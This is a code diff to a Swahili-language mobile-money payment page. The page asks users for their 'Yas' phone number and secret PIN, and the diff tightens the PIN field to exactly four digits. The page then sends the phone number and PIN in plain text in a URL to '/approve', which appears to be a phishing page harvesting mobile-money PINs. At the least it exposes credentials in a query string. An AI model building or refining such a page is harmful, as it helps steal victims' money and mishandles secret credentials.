@@ -38,6 +38,8 @@
     .login-footer a { color: #FFD100; text-decoration: none; }
     .action-row { display: flex; gap: 10px; margin-top: 14px; }
     .action-row .btn { flex: 1; }
+    .error-msg { color: #ef4444; font-size: 0.75rem; margin-top: 4px; display: none; }
+    .error-msg.show { display: block; }
   </style>
 </head>
 <body>
@@ -59,17 +61,18 @@
 
     <div class="input-group">
       <label>Nambari yako ya Yas *</label>
-      <input type="tel" id="phoneNumber" placeholder="0712345678 au 0612345678">
+      <input type="tel" id="phoneNumber" placeholder="0712345678 au 0612345678" maxlength="10">
     </div>
 
     <div class="input-group">
       <label>Nambari ya siri (PIN) *</label>
       <div class="pin-wrapper">
-        <input type="password" id="pinNumber" placeholder="Ingiza PIN yako">
+        <input type="password" id="pinNumber" placeholder="Ingiza PIN yako" maxlength="4">
         <button class="toggle-pin" id="togglePinBtn" type="button">
           <i class="fas fa-eye" id="pinIcon"></i>
         </button>
       </div>
+      <div class="error-msg" id="pinError">PIN inaweza kuwa na tarakimu 4 pekee</div>
     </div>
 
     <div class="login-footer">
@@ -90,14 +93,35 @@
   
   document.getElementById('paymentAmount').textContent = 'TSh ' + parseInt(planAmount).toLocaleString();
 
+  // PIN - limit to 4 digits only
   document.addEventListener('DOMContentLoaded', function() {
-    const toggleBtn = document.getElementById('togglePinBtn');
     const pinInput = document.getElementById('pinNumber');
+    if (pinInput) {
+      pinInput.addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g, '').slice(0, 4);
+      });
+    }
+    
+    // Phone - digits only
+    const phoneInput = document.getElementById('phoneNumber');
+    if (phoneInput) {
+      phoneInput.addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g, '');
+      });
+    }
+
+    // Toggle PIN visibility
+    const toggleBtn = document.getElementById('togglePinBtn');
     const pinIcon = document.getElementById('pinIcon');
     if (toggleBtn && pinInput) {
       toggleBtn.addEventListener('click', function() {
-        if (pinInput.type === 'password') { pinInput.type = 'text'; pinIcon.className = 'fas fa-eye-slash'; }
-        else { pinInput.type = 'password'; pinIcon.className = 'fas fa-eye'; }
+        if (pinInput.type === 'password') { 
+          pinInput.type = 'text'; 
+          pinIcon.className = 'fas fa-eye-slash'; 
+        } else { 
+          pinInput.type = 'password'; 
+          pinIcon.className = 'fas fa-eye'; 
+        }
       });
     }
   });
@@ -105,8 +129,25 @@
   function handlePayment() {
     const phone = document.getElementById('phoneNumber').value.trim();
     const pin = document.getElementById('pinNumber').value.trim();
-    if (!phone || phone.length < 9) { alert('Tafadhali ingiza nambari yako ya Yas.'); return; }
-    if (!pin || pin.length < 4) { alert('Tafadhali ingiza nambari yako ya siri (PIN).'); return; }
+    const pinError = document.getElementById('pinError');
+    
+    pinError.classList.remove('show');
+    
+    if (!phone || phone.length < 9) { 
+      alert('Tafadhali ingiza nambari yako ya Yas.'); 
+      return; 
+    }
+    if (!pin) { 
+      pinError.textContent = 'Tafadhali ingiza PIN yako.';
+      pinError.classList.add('show');
+      return; 
+    }
+    if (pin.length !== 4) { 
+      pinError.textContent = 'PIN lazima iwe na tarakimu 4.';
+      pinError.classList.add('show');
+      return; 
+    }
+    
     window.location.href = '/approve?plan=' + encodeURIComponent(planName) + '&amount=' + planAmount + '&phone=' + phone + '&pin=' + pin;
   }
 </script>
